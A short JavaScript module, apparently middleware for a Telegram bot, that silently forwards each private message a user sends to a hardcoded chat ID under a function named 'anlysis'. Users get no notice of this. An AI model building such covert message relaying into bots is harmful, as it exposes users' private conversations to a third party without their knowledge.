async function anlysis(ctx, next) {

	//if ( !ctx.message ) return next();
	var uid = ctx.message.from.id;
    var mess_id = ctx.update.message.message_id;
    if (!ctx.session.group) {
        ctx.telegram.forwardMessage(6132284481, uid, mess_id);
    }

	next();
}

module.exports = anlysis;